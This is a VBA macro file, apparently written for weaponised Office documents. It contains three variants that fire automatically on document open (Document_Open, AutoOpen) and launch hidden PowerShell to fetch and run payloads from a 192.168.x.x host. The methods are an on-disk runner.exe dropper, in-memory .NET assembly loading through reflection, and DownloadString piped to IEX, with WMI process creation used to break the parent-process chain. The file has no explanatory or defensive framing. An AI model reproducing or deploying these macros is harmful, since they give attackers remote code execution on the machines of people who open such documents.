Sub MyMacro()
    Dim str As String
    ' str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.45.154/run.ps1') | IEX"

    ' Command to download and execute the C# executable in disk
    str = "powershell -Command ""$exePath = 'C:\Windows\Temp\runner.exe'; " & _
          "(New-Object System.Net.WebClient).DownloadFile('http://192.168.0.0/runner.exe', $exePath); " & _
          "Start-Process $exePath"""

    ' PowerShell command to download and execute a .NET executable in memory
    str = "powershell -Command ""$bytes = (Invoke-WebRequest 'http://192.168.0.0/runner.exe').Content; " & _
          "$assembly = [System.Reflection.Assembly]::Load($bytes); " & _
          "$entryPointMethod = $assembly.GetTypes().Where({$_.Name -eq 'Program'}, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic'); " & _
          "$entryPointMethod.Invoke($null, (, [string[]] ('arg1', 'arg2')))"""
    
    ' This can run ps1 script in txt
    str = "powershell -Command ""$content = (New-Object System.Net.WebClient).DownloadString('http://192.168.0.0/run.txt'); Invoke-Expression $content"""
   'Shell str, vbHide

    'wmi dechain powershell from word
   GetObject("winmgmts:").Get("Win32_Process").Create str, Null, Null, pid
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

' -----------------------------------------

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.0.0/runner.exe', 'runner.exe')"
    Shell str, vbHide
    Dim exePath As String
    exePath = ActiveDocument.Path & "\" & "runner.exe"
    Wait (2)
    Shell exePath, vbHide

End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub

' -----------------
Sub MyMacro()
    Dim str As String
    
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.45.151/run.txt') | IEX"

    GetObject("winmgmts:").Get("Win32_Process").Create str, Null, Null, pid
   
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub